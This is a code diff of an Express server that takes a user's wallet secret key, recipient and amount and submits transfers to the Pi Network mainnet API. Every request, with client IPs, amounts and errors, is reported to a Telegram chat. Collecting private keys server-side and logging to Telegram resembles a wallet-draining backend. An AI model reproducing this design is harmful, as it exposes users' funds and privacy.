@@ -42,51 +42,16 @@ async function sendTelegramMessage(message) {
     }
 }
 
-// 🔁 Endpoint Submit XDR
+// 🔁 Endpoint utama: Kirim XLM langsung (bukan XDR manual)
 app.post('/api/submit', async (req, res) => {
-    const { xdr } = req.body;
-    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
-
-    let logMessage = `<b>[${timestamp}] XDR Masuk</b>\n`;
-    logMessage += `<b>IP:</b> ${clientIp}\n`;
-    logMessage += `<b>XDR:</b> ${xdr ? xdr.substring(0, 100) + '...' : 'Kosong'}`;
-    await sendTelegramMessage(logMessage);
-
-    if (!xdr) {
-        return res.status(400).json({ error: 'XDR tidak ditemukan' });
-    }
-
-    try {
-        const formData = new URLSearchParams();
-        formData.append("tx", xdr);
-
-        const response = await request("https://api.mainnet.minepi.com/transactions", {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: formData.toString()
-        });
-
-        const result = await response.body.json();
-
-        let resultMsg = `<b>[${timestamp}] Hasil Submit</b>\n<b>Status:</b> ${response.statusCode}\n<pre>${JSON.stringify(result, null, 2).substring(0, 500)}...</pre>`;
-        await sendTelegramMessage(resultMsg);
-
-        return res.status(response.statusCode).json(result);
-    } catch (err) {
-        await sendTelegramMessage(`<b>[${timestamp}] ERROR Koneksi ke Horizon</b>\n<pre>${err.message}</pre>`);
-        return res.status(502).json({ error: "Gagal koneksi ke Horizon", message: err.message });
-    }
-});
-
-// 💸 Endpoint Transfer langsung
-app.post('/api/transfer', async (req, res) => {
     const { secret, to, amount, memo } = req.body;
     const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
     if (!secret || !to || !amount) {
-        return res.status(400).json({ error: 'Missing secret, to, or amount' });
+        const errMsg = `❌ Data kurang: secret, to, amount wajib`;
+        await sendTelegramMessage(`<b>[${timestamp}] ERROR</b>\n${errMsg}\n<b>IP:</b> ${clientIp}`);
+        return res.status(400).json({ error: errMsg });
     }
 
     try {
@@ -129,14 +94,15 @@ app.post('/api/transfer', async (req, res) => {
 
         const result = await response.body.json();
 
-        let logMessage = `<b>[${timestamp}] Transfer XLM</b>\n`;
+        let logMessage = `<b>[${timestamp}] ✅ TRANSFER XLM</b>\n`;
         logMessage += `<b>Dari:</b> ${publicKey}\n<b>Ke:</b> ${to}\n<b>Jumlah:</b> ${amount} XLM\n`;
+        if (memo) logMessage += `<b>Memo:</b> ${memo}\n`;
         logMessage += `<b>Status:</b> ${response.statusCode}\n<pre>${JSON.stringify(result, null, 2).substring(0, 500)}...</pre>`;
         await sendTelegramMessage(logMessage);
 
         return res.status(response.statusCode).json(result);
     } catch (err) {
-        await sendTelegramMessage(`<b>[${timestamp}] ERROR Transfer</b>\n<pre>${err.message}</pre>`);
+        await sendTelegramMessage(`<b>[${timestamp}] ❌ ERROR TRANSFER</b>\n<pre>${err.message}</pre>\n<b>IP:</b> ${clientIp}`);
         return res.status(500).json({ error: 'Gagal transfer', message: err.message });
     }
 });
